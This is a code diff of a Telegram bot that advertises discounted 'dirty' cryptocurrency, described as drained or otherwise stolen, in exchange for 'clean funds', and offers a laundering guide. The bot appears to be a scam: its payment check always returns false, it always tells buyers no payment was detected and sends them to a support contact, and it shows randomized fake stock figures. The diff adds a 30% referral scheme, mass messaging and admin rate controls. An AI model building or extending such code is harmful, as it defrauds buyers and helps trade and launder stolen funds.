@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Vold Market Bot"""
+"""Vold Market Bot – v2.1 (English only, immediate referral notifications)"""
 
 import asyncio
 import logging
@@ -24,6 +24,7 @@ ADMIN_ID = 8745164587
 SUPPORT_USERNAME = "@reuvensh"
 CHANNEL_USERNAME = "@voldmarket"
 VOUCHES_USERNAME = "@voldvouches"
+BOT_USERNAME = "@voldmarket_bot"
 
 CRYPTO_ADDRESSES = {
     "BTC": "bc1qudvjwuugrtkthdlwq76j0eam6lel8hcurf3rj5",
@@ -53,68 +54,88 @@ PRICE = {
 }
 STOCK = {"ETH": 87471.0, "BTC": 51785.0}
 
-# ==================== TRANSLATIONS ====================
+# ==================== TRANSLATIONS (English only) ====================
 T = {
-    "en": {
-        "start": (
-            "🤖 *Vold Market Bot*\n"
-            "Official bot of @voldmarket\n\n"
-            "Buy discounted crypto with a risky history.\n"
-            "Choose an option:"
-        ),
-        "buy": "💰 Buy Crypto",
-        "rates": "📊 Rates",
-        "faq": "❓ FAQ",
-        "tos": "📝 TOS",
-        "support": "🛡️ Support",
-        "channel": "📢 Channel",
-        "vouches": "✅ Vouches",
-        "language": "🌐 Language",
-        "buy_prompt": "How much do you want to pay (USD)?\nMinimum: $50",
-        "invalid_amount": "❌ Invalid amount. Enter a number >= 50.",
-        "choose_receive_coin": "Which coin do you want to **receive** (dirty)?",
-        "receive_estimate": (
-            "You pay: *${:.2f}*\n"
-            "Multiplier: *x{}*\n"
-            "You will receive: *${:.2f}* worth of *{}*\n"
-            "That's approximately *{:.6f} {}*\n\n"
-            "Now enter your *{}* address where you want to receive the dirty coins:"
-        ),
-        "invalid_address": "⚠️ Invalid address. Please enter a valid {} address.",
-        "choose_payment_method": "Great! Now choose the cryptocurrency you want to **pay with** (clean funds):",
-        "payment_instruction": (
-            "Send exactly *{:.6f} {}* to:\n"
-            "`{}`\n\n"
-            "This is equivalent to *${:.2f}* USD.\n"
-            "After sending, click the button below."
-        ),
-        "i_paid": "✅ I have paid",
-        "cancel": "❌ Cancel",
-        "back": "🔙 Back",
-        "checking_payment": "⏳ Checking for your payment...",
-        "no_payment": (
-            "❌ No payment detected yet.\n"
-            "New check in 60 seconds. You can cancel the transaction below."
-        ),
-        "payment_found": (
-            "❌ Payment not detected!\n"
-            "Please contact {} to finalize your dirty coins delivery."
-        ),
-        "admin_notify": (
-            "🤑 *New payment notification!*\n"
-            "User: @{}\n"
-            "Amount: ${:.2f} / {:.6f} {}\n"
-            "Receives: {:.6f} {} (dirty)\n"
-            "Receive address: `{}`"
-        ),
-        "support_text": "For any questions, contact {}",
-        "tos_text": """📝 *Terms Of Services*
+    "start": (
+        "🤖 *Vold Market Bot*\n"
+        "Official bot of @voldmarket\n\n"
+        "Buy discounted crypto with a risky history.\n"
+        "Choose an option:"
+    ),
+    "buy": "💰 Buy Crypto",
+    "referral": "👥 Referral",
+    "rates": "📊 Rates",
+    "faq": "❓ FAQ",
+    "tos": "📝 TOS",
+    "support": "🛡️ Support",
+    "channel": "📢 Channel",
+    "vouches": "✅ Vouches",
+    "referral_info": (
+        "👥 *Referral Program*\n\n"
+        "Invite your friends and earn *30%* of every deposit they make.\n\n"
+        "Your referral link:\n"
+        "`https://t.me/{}?start=ref{}`\n\n"
+        "Your current earnings: *${:.2f}*\n\n"
+        "Share the link. When someone starts the bot through it and makes a purchase, you'll receive your commission automatically."
+    ),
+    "buy_prompt": "How much do you want to pay (USD)?\nMinimum: $50",
+    "invalid_amount": "❌ Invalid amount. Enter a number >= 50.",
+    "stock_error": "❌ Sorry, we don't have enough stock for that amount. Available stock: *${:,.0f}* in {} .",
+    "choose_receive_coin": "Which coin do you want to **receive** (dirty)?",
+    "receive_estimate": (
+        "You pay: *${:.2f}*\n"
+        "Multiplier: *x{}*\n"
+        "You will receive: *${:.2f}* worth of *{}*\n"
+        "That's approximately *{:.6f} {}*\n\n"
+        "Now enter your *{}* address where you want to receive the dirty coins:"
+    ),
+    "invalid_address": "⚠️ Invalid address. Please enter a valid {} address.",
+    "choose_payment_method": "Great! Now choose the cryptocurrency you want to **pay with** (clean funds):",
+    "payment_instruction": (
+        "Send exactly *{:.6f} {}* to:\n"
+        "`{}`\n\n"
+        "This is equivalent to *${:.2f}* USD.\n"
+        "After sending, click the button below."
+    ),
+    "i_paid": "✅ I have paid",
+    "cancel": "❌ Cancel",
+    "back": "🔙 Back",
+    "checking_payment": "⏳ Checking for your payment...",
+    "no_payment": (
+        "❌ No payment detected yet.\n"
+        "New check in 60 seconds. You can cancel the transaction below."
+    ),
+    "payment_found": (
+        "❌ Payment not detected!\n"
+        "Please contact {} to finalize your dirty coins delivery."
+    ),
+    "admin_notify": (
+        "🤑 *New payment notification!*\n"
+        "User: @{}\n"
+        "Amount: ${:.2f} / {:.6f} {}\n"
+        "Receives: {:.6f} {} (dirty)\n"
+        "Receive address: `{}`"
+    ),
+    "admin_notify_ref": (
+        "🤑 *New payment notification!*\n"
+        "User: @{}\n"
+        "Referred by: @{}\n"
+        "Amount: ${:.2f} / {:.6f} {}\n"
+        "Receives: {:.6f} {} (dirty)\n"
+        "Receive address: `{}`"
+    ),
+    "referrer_notify": (
+        "💰 Your referral @{} just made a purchase of *${:.2f}*!\n"
+        "You earned a commission of *${:.2f}*."
+    ),
+    "support_text": "For any questions, contact {}",
+    "tos_text": """📝 *Terms Of Services*
 1. Transaction: All trades are final. Prices are indicative and may change.
 2. Risk: Coins carry a risk of being flagged or frozen. We are not responsible.
 3. Liability: We are not liable for any losses, legal issues, or technical problems.
 4. Clean funds only: We only accept clean funds. Dirty funds will be refunded.
 5. Changes: Terms may be updated anytime.""",
-        "faq_text": """❓ *FAQ*
+    "faq_text": """❓ *FAQ*
 Q: Why are the coins cheaper?
 A: They have a risky history – Drain, call etc. That risk justifies the discount.
 
@@ -141,114 +162,29 @@ A: Once sent, it's out of our control. Use a new non‑KYC wallet.
 
 Q: How to clean?
 A: Guide provided with purchase.""",
-        "lang_changed": "✅ Language set to English.",
-        "flash_sale_message": "🔥 Flash Sales: Bonus +$100 for 1h! 🔥",
-        "stats_text": "📊 *Bot Statistics*\nTotal users: {}",
-    },
-    "fr": {
-        "start": (
-            "🤖 *Vold Market Bot*\n"
-            "Bot officiel de @voldmarket\n\n"
-            "Achetez de la crypto à prix réduit avec un historique risqué.\n"
-            "Choisissez une option :"
-        ),
-        "buy": "💰 Acheter",
-        "rates": "📊 Taux",
-        "faq": "❓ FAQ",
-        "tos": "📝 CGU",
-        "support": "🛡️ Support",
-        "channel": "📢 Canal",
-        "vouches": "✅ Avis",
-        "language": "🌐 Langue",
-        "buy_prompt": "Combien voulez-vous payer (USD) ?\nMinimum : 50 $",
-        "invalid_amount": "❌ Montant invalide. Entrez un nombre >= 50.",
-        "choose_receive_coin": "Quelle crypto voulez-vous *recevoir* (sale) ?",
-        "receive_estimate": (
-            "Vous payez : *${:.2f}*\n"
-            "Multiplicateur : *x{}*\n"
-            "Vous recevrez : *${:.2f}* en *{}*\n"
-            "Soit environ *{:.6f} {}*\n\n"
-            "Entrez maintenant votre adresse *{}* de réception (Crypto Sale) :"
-        ),
-        "invalid_address": "⚠️ Adresse invalide. Veuillez entrer une adresse {} valide.",
-        "choose_payment_method": "Parfait ! Choisissez maintenant la crypto avec laquelle vous voulez *payer* (fonds propres) :",
-        "payment_instruction": (
-            "Envoyez exactement *{:.6f} {}* à :\n"
-            "`{}`\n\n"
-            "Cela équivaut à *${:.2f}* USD.\n"
-            "Après l'envoi, cliquez sur le bouton ci-dessous."
-        ),
-        "i_paid": "✅ J'ai payé",
-        "cancel": "❌ Annuler",
-        "back": "🔙 Retour",
-        "checking_payment": "⏳ Vérification de votre paiement...",
-        "no_payment": (
-            "❌ Aucun paiement détecté.\n"
-            "Nouvelle vérification dans 60 secondes. Vous pouvez annuler ci-dessous."
-        ),
-        "payment_found": (
-            "❌ Paiement non détecté !\n"
-            "Veuillez contacter {} pour finaliser la livraison de votre crypto."
-        ),
-        "admin_notify": (
-            "🤑 *Nouvelle notification de paiement !*\n"
-            "Utilisateur : @{}\n"
-            "Montant : ${:.2f} / {:.6f} {}\n"
-            "Reçoit : {:.6f} {} (sale)\n"
-            "Adresse de réception : `{}`"
-        ),
-        "support_text": "Pour toute question, contactez {}",
-        "tos_text": """📝 *Conditions Générales*
-1. Transaction : Toutes les transactions sont définitives. Les prix sont indicatifs.
-2. Risque : Les crypto comportent un risque d'être signalées ou gelées. Nous ne sommes pas responsables.
-3. Responsabilité : Nous ne sommes pas responsables des pertes, problèmes juridiques ou techniques.
-4. Fonds propres uniquement : Nous n'acceptons que des fonds propres. Fonds sales remboursés.
-5. Modifications : Les conditions peuvent être mises à jour à tout moment.""",
-        "faq_text": """❓ *FAQ*
-Q : Pourquoi les crypto sont-elles moins chères ?
-R : Elles ont un historique risqué – Drain, call etc. Cette décote est normale.
-
-Q : Comment acheter ?
-R : Utilisez le bot ou contactez @reuvensh. Vous recevrez une adresse de dépôt.
-
-Q : Minimum ?
-R : 50 $ équivalent. Pas de maximum.
-
-Q : Pourquoi ne nettoyez-vous pas les crypto vous-mêmes ?
-R : Le nettoyage de gros volumes prend du temps et disperse le risque. Nous préférons vendre à prix réduit.
-
-Q : Intermédiaire ?
-R : Oui, accepté à vos frais.
-
-Q : Délai de livraison ?
-R : Habituellement sous 30 minutes.
-
-Q : Anonymat ?
-R : Aucune info personnelle demandée. Votre anonymat dépend de votre configuration.
-
-Q : Que faire si les crypto sont gelées ?
-R : Une fois envoyées, nous n'avons plus le contrôle. Utilisez un nouveau portefeuille non‑KYC.
-
-Q : Comment nettoyer ?
-R : Un guide sera fourni avec votre achat.""",
-        "lang_changed": "✅ Langue définie sur Français.",
-        "flash_sale_message": "🔥 Offre Flash : Bonus +100$ pendant 1h ! 🔥",
-        "stats_text": "📊 *Statistiques du Bot*\nUtilisateurs totaux : {}",
-    },
+    "lang_changed": "✅ Language set to English.",
+    "flash_sale_message": "🔥 Flash Sales: Bonus +$100 for 1h! 🔥",
+    "stats_text": (
+        "📊 *Bot Statistics*\n"
+        "Total users: {}\n"
+        "Referral participants: {}\n"
+        "Total referral commissions: ${:.2f}"
+    ),
+    "rates_updated": "✅ Multiplier tiers updated.",
+    "rates_reset": "✅ Multiplier tiers reset to default.",
+    "invalid_tier": "❌ Invalid tier format. Use: /setrates <low> <high> <mult>",
 }
 
 # ==================== GLOBALS ====================
-user_languages: Dict[int, str] = {}
 all_users: Set[int] = set()
 pending_checks: Dict[int, asyncio.Task] = {}
 
-# ==================== HELPERS ====================
-def get_lang(update: Update, context: ContextTypes.DEFAULT_TYPE) -> str:
-    user_id = update.effective_user.id
-    return user_languages.get(user_id, "en")
+referral_tree: Dict[int, int] = {}
+referral_balance: Dict[int, float] = {}
 
-def t(key: str, lang: str, *args) -> str:
-    return T[lang][key].format(*args)
+# ==================== HELPERS ====================
+def t(key: str, *args) -> str:
+    return T[key].format(*args)
 
 def get_multiplier(amount: float) -> float:
     for low, high, mult in MULTIPLIER_TIERS:
@@ -256,21 +192,20 @@ def get_multiplier(amount: float) -> float:
             return mult
     return 1.0
 
-def main_menu(lang: str) -> InlineKeyboardMarkup:
+def main_menu() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton(T[lang]["buy"], callback_data="buy")],
-        [InlineKeyboardButton(T[lang]["rates"], callback_data="rates")],
-        [InlineKeyboardButton(T[lang]["faq"], callback_data="faq")],
-        [InlineKeyboardButton(T[lang]["tos"], callback_data="tos")],
-        [InlineKeyboardButton(T[lang]["support"], callback_data="support")],
-        [InlineKeyboardButton(T[lang]["channel"], url=f"https://t.me/{CHANNEL_USERNAME[1:]}")],
-        [InlineKeyboardButton(T[lang]["vouches"], url=f"https://t.me/{VOUCHES_USERNAME[1:]}")],
-        [InlineKeyboardButton(T[lang]["language"], callback_data="lang")],
+        [InlineKeyboardButton(T["buy"], callback_data="buy")],
+        [InlineKeyboardButton(T["referral"], callback_data="referral")],
+        [InlineKeyboardButton(T["rates"], callback_data="rates")],
+        [InlineKeyboardButton(T["faq"], callback_data="faq")],
+        [InlineKeyboardButton(T["tos"], callback_data="tos")],
+        [InlineKeyboardButton(T["support"], callback_data="support")],
+        [InlineKeyboardButton(T["channel"], url=f"https://t.me/{CHANNEL_USERNAME[1:]}")],
+        [InlineKeyboardButton(T["vouches"], url=f"https://t.me/{VOUCHES_USERNAME[1:]}")],
     ])
 
 # ==================== STOCK UPDATER ====================
 async def stock_updater():
-    """Update stock values randomly every 30 minutes."""
     while True:
         STOCK["ETH"] = round(random.uniform(80_000, 90_000), 2)
         STOCK["BTC"] = round(random.uniform(50_000, 60_000), 2)
@@ -281,44 +216,42 @@ async def stock_updater():
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = update.effective_user.id
     all_users.add(user_id)
-    lang = get_lang(update, context)
-    if update.callback_query:
-        query = update.callback_query
-        await query.answer()
-        await query.edit_message_text(t("start", lang), reply_markup=main_menu(lang), parse_mode=ParseMode.MARKDOWN)
-    else:
-        await update.message.reply_text(t("start", lang), reply_markup=main_menu(lang), parse_mode=ParseMode.MARKDOWN)
+
+    if update.message and update.message.text:
+        args = update.message.text.split()
+        if len(args) > 1 and args[1].startswith("ref"):
+            try:
+                referrer_id = int(args[1][3:])
+            except:
+                referrer_id = None
+            if referrer_id and referrer_id != user_id and referrer_id in all_users:
+                referral_tree[user_id] = referrer_id
+                await update.message.reply_text("You were invited by a friend. You both will benefit from the referral program!")
+
+    await update.message.reply_text(T["start"], reply_markup=main_menu(), parse_mode=ParseMode.MARKDOWN)
 
 async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     query = update.callback_query
     await query.answer()
     data = query.data
-    lang = get_lang(update, context)
-    if data in ("rates", "faq", "tos", "support"):
-        if data == "rates":
-            text = "📊 *Rates (x multiplier)*\n\n"
-            for low, high, mult in MULTIPLIER_TIERS:
-                text += f"${low}-${high if high < float('inf') else '+'}: x{mult}\n"
-            text += f"\n💰 *Available stock*: ETH ${STOCK['ETH']:,.0f}, BTC ${STOCK['BTC']:,.0f}"
-        elif data == "faq":
-            text = t("faq_text", lang)
-        elif data == "tos":
-            text = t("tos_text", lang)
-        elif data == "support":
-            text = t("support_text", lang, SUPPORT_USERNAME)
-        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(T[lang]["back"], callback_data="back")]]), parse_mode=ParseMode.MARKDOWN)
-    elif data == "lang":
-        keyboard = [
-            [InlineKeyboardButton("🇬🇧 English", callback_data="set_lang_en")],
-            [InlineKeyboardButton("🇫🇷 Français", callback_data="set_lang_fr")],
-            [InlineKeyboardButton(T[lang]["back"], callback_data="back")],
-        ]
-        await query.edit_message_text("Choose language / Choisissez la langue :", reply_markup=InlineKeyboardMarkup(keyboard))
-    elif data.startswith("set_lang_"):
-        new_lang = data.split("_")[2]
-        user_languages[query.from_user.id] = new_lang
-        await query.edit_message_text(t("lang_changed", new_lang))
-        await cmd_start(update, context)
+    user_id = query.from_user.id
+
+    if data == "rates":
+        text = "📊 *Rates (x multiplier)*\n\n"
+        for low, high, mult in MULTIPLIER_TIERS:
+            text += f"${low}-${high if high < float('inf') else '+'}: x{mult}\n"
+        text += f"\n💰 *Available stock*: ETH ${STOCK['ETH']:,.0f}, BTC ${STOCK['BTC']:,.0f}"
+        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(T["back"], callback_data="back")]]), parse_mode=ParseMode.MARKDOWN)
+    elif data == "faq":
+        await query.edit_message_text(T["faq_text"], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(T["back"], callback_data="back")]]), parse_mode=ParseMode.MARKDOWN)
+    elif data == "tos":
+        await query.edit_message_text(T["tos_text"], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(T["back"], callback_data="back")]]), parse_mode=ParseMode.MARKDOWN)
+    elif data == "support":
+        await query.edit_message_text(t("support_text", SUPPORT_USERNAME), reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(T["back"], callback_data="back")]]))
+    elif data == "referral":
+        earnings = referral_balance.get(user_id, 0.0)
+        text = t("referral_info", BOT_USERNAME, user_id, earnings)
+        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(T["back"], callback_data="back")]]), parse_mode=ParseMode.MARKDOWN)
     elif data == "back":
         await cmd_start(update, context)
 
@@ -328,34 +261,31 @@ AMOUNT, COIN_RECEIVE, ADDRESS_RECEIVE, PAYMENT_METHOD, PAYMENT = range(5)
 async def buy_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     query = update.callback_query
     await query.answer()
-    lang = get_lang(update, context)
-    await query.edit_message_text(t("buy_prompt", lang))
+    await query.edit_message_text(T["buy_prompt"])
     return AMOUNT
 
 async def amount_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    lang = get_lang(update, context)
     text = update.message.text.strip()
     try:
         amount = float(text)
         if amount < 50:
             raise ValueError
     except ValueError:
-        await update.message.reply_text(t("invalid_amount", lang))
+        await update.message.reply_text(T["invalid_amount"])
         return AMOUNT
     context.user_data["pay_amount"] = amount
     context.user_data["multiplier"] = get_multiplier(amount)
     keyboard = [
         [InlineKeyboardButton("BTC", callback_data="receive_BTC")],
         [InlineKeyboardButton("ETH", callback_data="receive_ETH")],
-        [InlineKeyboardButton(t("cancel", lang), callback_data="cancel")],
+        [InlineKeyboardButton(T["cancel"], callback_data="cancel")],
     ]
-    await update.message.reply_text(t("choose_receive_coin", lang), reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
+    await update.message.reply_text(T["choose_receive_coin"], reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
     return COIN_RECEIVE
 
 async def coin_receive(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     query = update.callback_query
     await query.answer()
-    lang = get_lang(update, context)
     if query.data == "cancel":
         await query.edit_message_text("Purchase cancelled.")
         await cmd_start(update, context)
@@ -365,18 +295,26 @@ async def coin_receive(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     pay_amount = context.user_data["pay_amount"]
     multiplier = context.user_data["multiplier"]
     receive_value = pay_amount * multiplier
+
+    if coin in STOCK and receive_value > STOCK[coin]:
+        await query.edit_message_text(
+            t("stock_error", STOCK[coin], coin),
+            parse_mode=ParseMode.MARKDOWN,
+        )
+        await cmd_start(update, context)
+        return ConversationHandler.END
+
     context.user_data["receive_value"] = receive_value
     dirty_price = PRICE[coin]
     dirty_amount = receive_value / dirty_price
     context.user_data["dirty_amount"] = dirty_amount
     await query.edit_message_text(
-        t("receive_estimate", lang, pay_amount, multiplier, receive_value, coin, dirty_amount, coin, coin),
+        t("receive_estimate", pay_amount, multiplier, receive_value, coin, dirty_amount, coin, coin),
         parse_mode=ParseMode.MARKDOWN,
     )
     return ADDRESS_RECEIVE
 
 async def receive_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    lang = get_lang(update, context)
     address = update.message.text.strip()
     coin = context.user_data["receive_coin"]
     valid = False
@@ -387,7 +325,7 @@ async def receive_address(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
         if address.startswith("0x") and len(address) == 42:
             valid = True
     if not valid:
-        await update.message.reply_text(t("invalid_address", lang, coin))
+        await update.message.reply_text(t("invalid_address", coin))
         return ADDRESS_RECEIVE
     context.user_data["receive_address"] = address
     payment_methods = ["BTC", "ETH", "SOL", "LTC", "BNB", "USDT_TRC20", "XMR"]
@@ -395,14 +333,13 @@ async def receive_address(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     for p in payment_methods:
         label = p if p != "USDT_TRC20" else "USDT (TRC-20)"
         keyboard.append([InlineKeyboardButton(label, callback_data=f"paymethod_{p}")])
-    keyboard.append([InlineKeyboardButton(t("cancel", lang), callback_data="cancel")])
-    await update.message.reply_text(t("choose_payment_method", lang), reply_markup=InlineKeyboardMarkup(keyboard))
+    keyboard.append([InlineKeyboardButton(T["cancel"], callback_data="cancel")])
+    await update.message.reply_text(T["choose_payment_method"], reply_markup=InlineKeyboardMarkup(keyboard))
     return PAYMENT_METHOD
 
 async def payment_method(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     query = update.callback_query
     await query.answer()
-    lang = get_lang(update, context)
     if query.data == "cancel":
         await query.edit_message_text("Purchase cancelled.")
         await cmd_start(update, context)
@@ -414,10 +351,10 @@ async def payment_method(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     crypto_amount = pay_amount / price if price else 0
     context.user_data["pay_crypto_amount"] = crypto_amount
     address = CRYPTO_ADDRESSES[pay_coin]
-    text = t("payment_instruction", lang, crypto_amount, pay_coin, address, pay_amount)
+    text = t("payment_instruction", crypto_amount, pay_coin, address, pay_amount)
     keyboard = [
-        [InlineKeyboardButton(t("i_paid", lang), callback_data="check_payment")],
-        [InlineKeyboardButton(t("cancel", lang), callback_data="cancel")],
+        [InlineKeyboardButton(T["i_paid"], callback_data="check_payment")],
+        [InlineKeyboardButton(T["cancel"], callback_data="cancel")],
     ]
     await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
     return PAYMENT
@@ -425,57 +362,80 @@ async def payment_method(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
 async def check_payment(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     query = update.callback_query
     await query.answer()
-    lang = get_lang(update, context)
     user_id = query.from_user.id
     pay_coin = context.user_data["pay_coin"]
     expected = context.user_data["pay_crypto_amount"]
-    address = CRYPTO_ADDRESSES[pay_coin]
-
-    # Notify admin immediately when the user clicks "I have paid"
     pay_amount = context.user_data["pay_amount"]
-    admin_text = t("admin_notify", lang,
-                   query.from_user.username or user_id,
-                   pay_amount, expected, pay_coin,
-                   context.user_data["dirty_amount"],
-                   context.user_data["receive_coin"],
-                   context.user_data["receive_address"])
+    receive_coin = context.user_data["receive_coin"]
+    dirty_amount = context.user_data["dirty_amount"]
+    receive_address = context.user_data["receive_address"]
+
+    # ---- Traitement immédiat du parrainage ----
+    referrer_id = referral_tree.get(user_id)
+    if referrer_id:
+        commission = pay_amount * 0.30
+        referral_balance[referrer_id] = referral_balance.get(referrer_id, 0.0) + commission
+        # Notifier le parrain
+        referrer_name = (await context.bot.get_chat(referrer_id)).username or referrer_id
+        buyer_name = query.from_user.username or user_id
+        try:
+            await context.bot.send_message(
+                referrer_id,
+                t("referrer_notify", buyer_name, pay_amount, commission),
+                parse_mode=ParseMode.MARKDOWN,
+            )
+        except:
+            pass
+        # Message admin avec info parrainage
+        admin_text = t("admin_notify_ref",
+                       buyer_name,
+                       referrer_name,
+                       pay_amount, expected, pay_coin,
+                       dirty_amount, receive_coin,
+                       receive_address)
+    else:
+        admin_text = t("admin_notify",
+                       query.from_user.username or user_id,
+                       pay_amount, expected, pay_coin,
+                       dirty_amount, receive_coin,
+                       receive_address)
+
     await context.bot.send_message(ADMIN_ID, admin_text, parse_mode=ParseMode.MARKDOWN)
 
-    paid = await verify_payment(pay_coin, address, expected)  # always False for now
+    # Marque le parrainage comme traité pour éviter une double commission
+    context.user_data["referral_processed"] = True
+
+    paid = await verify_payment(pay_coin, CRYPTO_ADDRESSES[pay_coin], expected)
     if paid:
-        await query.edit_message_text(t("payment_found", lang, SUPPORT_USERNAME))
+        await query.edit_message_text(t("payment_found", SUPPORT_USERNAME))
         await cmd_start(update, context)
         return ConversationHandler.END
     else:
-        # Cancel any existing pending task
         if user_id in pending_checks:
             pending_checks[user_id].cancel()
-        # Show "no payment" with Cancel button only
-        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton(t("cancel", lang), callback_data="cancel")]])
-        await query.edit_message_text(t("no_payment", lang), reply_markup=keyboard)
-        # Create background task
+        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton(T["cancel"], callback_data="cancel")]])
+        await query.edit_message_text(T["no_payment"], reply_markup=keyboard)
         task = asyncio.create_task(recheck_payment_after_delay(
             context.bot, user_id, query.message.chat_id, query.message.message_id,
-            pay_coin, address, expected, lang, context.user_data.copy()
+            pay_coin, expected, context.user_data.copy(),
         ))
         pending_checks[user_id] = task
         return PAYMENT
 
 async def recheck_payment_after_delay(bot, user_id, chat_id, message_id,
-                                      pay_coin, address, expected, lang, user_data):
+                                      pay_coin, expected, user_data):
     try:
         await asyncio.sleep(60)
-        paid = await verify_payment(pay_coin, address, expected)
+        paid = await verify_payment(pay_coin, CRYPTO_ADDRESSES[pay_coin], expected)
         if paid:
-            # No admin notification after the 60-second delay
             await bot.edit_message_text(
-                t("payment_found", lang, SUPPORT_USERNAME),
-                chat_id=chat_id, message_id=message_id
+                t("payment_found", SUPPORT_USERNAME),
+                chat_id=chat_id, message_id=message_id,
             )
         else:
             await bot.edit_message_text(
-                t("payment_found", lang, SUPPORT_USERNAME),
-                chat_id=chat_id, message_id=message_id
+                t("payment_found", SUPPORT_USERNAME),
+                chat_id=chat_id, message_id=message_id,
             )
     except asyncio.CancelledError:
         pass
@@ -495,21 +455,26 @@ async def cancel_buy(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     return ConversationHandler.END
 
 async def verify_payment(crypto: str, address: str, expected: float) -> bool:
-    # Stub – replace with actual blockchain check
     return False
 
 # ==================== ADMIN COMMANDS ====================
 async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if update.effective_user.id != ADMIN_ID:
         return
-    lang = get_lang(update, context)
-    await update.message.reply_text(t("stats_text", lang, len(all_users)), parse_mode=ParseMode.MARKDOWN)
+    total_refs = len(referral_tree)
+    total_comm = sum(referral_balance.values())
+    await update.message.reply_text(
+        t("stats_text", len(all_users), total_refs, total_comm),
+        parse_mode=ParseMode.MARKDOWN,
+    )
 
 async def cmd_dmall(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if update.effective_user.id != ADMIN_ID:
         return
-    lang = get_lang(update, context)
-    message = t("flash_sale_message", lang)
+    if context.args:
+        message = " ".join(context.args)
+    else:
+        message = T["flash_sale_message"]
     success = 0
     for uid in all_users:
         try:
@@ -519,16 +484,50 @@ async def cmd_dmall(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             logging.warning(f"Could not DMALL to {uid}: {e}")
     await update.message.reply_text(f"DMALL sent to {success}/{len(all_users)} users.")
 
+async def cmd_setrates(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if update.effective_user.id != ADMIN_ID:
+        return
+    if not context.args or len(context.args) != 3:
+        await update.message.reply_text(T["invalid_tier"])
+        return
+    try:
+        low = float(context.args[0])
+        high = float(context.args[1])
+        mult = float(context.args[2])
+    except ValueError:
+        await update.message.reply_text(T["invalid_tier"])
+        return
+    replaced = False
+    for i, (l, h, m) in enumerate(MULTIPLIER_TIERS):
+        if l == low:
+            MULTIPLIER_TIERS[i] = (low, high, mult)
+            replaced = True
+            break
+    if not replaced:
+        MULTIPLIER_TIERS.append((low, high, mult))
+        MULTIPLIER_TIERS.sort(key=lambda x: x[0])
+    await update.message.reply_text(T["rates_updated"])
+
+async def cmd_resetrates(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if update.effective_user.id != ADMIN_ID:
+        return
+    global MULTIPLIER_TIERS
+    MULTIPLIER_TIERS = [
+        (50, 199.99, 2.5),
+        (200, 499.99, 3.0),
+        (500, 999.99, 3.5),
+        (1000, float("inf"), 4.0),
+    ]
+    await update.message.reply_text(T["rates_reset"])
+
 # ==================== MAIN ====================
 async def on_startup(app: Application):
-    # Start stock updater as background task
     asyncio.create_task(stock_updater())
 
 def main() -> None:
     logging.basicConfig(level=logging.INFO)
     app = Application.builder().token(BOT_TOKEN).post_init(on_startup).build()
 
-    # Conversation handler for buy flow
     conv_handler = ConversationHandler(
         entry_points=[CallbackQueryHandler(buy_start, pattern="^buy$")],
         states={
@@ -545,13 +544,13 @@ def main() -> None:
     )
     app.add_handler(conv_handler)
 
-    # Main menu callbacks
-    app.add_handler(CallbackQueryHandler(menu_callback, pattern="^(rates|faq|tos|support|lang|set_lang_..|back)$"))
+    app.add_handler(CallbackQueryHandler(menu_callback, pattern="^(referral|rates|faq|tos|support|back)$"))
     app.add_handler(CommandHandler("start", cmd_start))
 
-    # Admin commands
     app.add_handler(CommandHandler("stats", cmd_stats))
     app.add_handler(CommandHandler("dmall", cmd_dmall))
+    app.add_handler(CommandHandler("setrates", cmd_setrates))
+    app.add_handler(CommandHandler("resetrates", cmd_resetrates))
 
     print("Bot running...")
     app.run_polling()
